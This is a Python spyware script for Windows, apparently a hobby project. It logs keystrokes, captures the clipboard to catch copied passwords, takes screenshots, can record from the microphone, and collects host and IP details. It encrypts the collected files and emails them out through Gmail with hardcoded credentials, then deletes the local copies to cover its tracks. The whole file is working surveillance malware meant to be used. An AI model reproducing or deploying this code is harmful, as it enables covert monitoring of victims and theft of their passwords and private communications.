from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
email_address = "testeremail@gmail.com"
password= "password123"
system_information = "systeminfo.txt"
toaddr = "testeremail@gmail.com"
clipboard_information = "clipboard.txt"
microphone_time = 10
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
key = "zU7vsBaZKUwbn53Ytprg5ySJel-IIhRkLYg1XPV9pTc="
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
time_iteration = 15
username = getpass.getuser()
file_path= "C:\\Users\\swbea\\PycharmProjects\\pythonProject\\Project"
extend ="\\"
file_merge = file_path + extend
number_of_iterations_end = 3
count = 0
keys = []

## Sends email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log file"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application','octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    # Add headers and attach message
    p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)   # Connect to email server

    s.starttls()  # Create tls session
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def microphone():
    fs = 44100 # Frequency
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs),samplerate=fs,channels=2)
    sd.wait()

    # Write to .wav file
    write(file_path + extend + audio_information, fs,myrecording)
def copy_clipboard():  # Get clipboard information for when copying password ect
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)#write data to file

        except:
            f.write("Clipboard could not be copied - not string")

copy_clipboard()
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
def computer_information():
    with open(file_path + extend + system_information, "w+") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:  # API only allows certain number of uses
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address:  " + public_ip)

        except Exception:
            f.write("Couldn't get public IP address (likely max query)")

        # Get processor information
        f.write("Processor: " + (platform.processor()) + '\n')
        # Get windows information
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        # Get machine
        f.write("Machine: " + platform.machine() + '\n')
        # Get hostname
        f.write("Hostname: " + hostname + '\n')
        # Private IP address
        f.write("Private IP address: " + IPAddr + '\n')
computer_information()

screenshot()

# Add timer controls
number_of_iterations = 0
current_time = time.time()
stopping_time = time.time()  + time_iteration

while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0 :
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information,file_path+extend+screenshot_information,toaddr)
        copy_clipboard()
        number_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration


files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge+keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge+keys_information_e]
count = 0

for ecrypting_file in files_to_encrypt:
    # Open up and read each file then encrypt
    with open(files_to_encrypt[count],'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open (encrypted_file_names[count],'wb') as f: # writes to new file
        f.write(encrypted)
    send_email(encrypted_file_names[count], encrypted_file_names[count],toaddr)
    count += 1

time.sleep(120)
# Clean up and delete files
delete_files = [system_information,clipboard_information,keys_information,screenshot_information,audio_information]
for file in delete_files:
    os.remove(file_merge + file)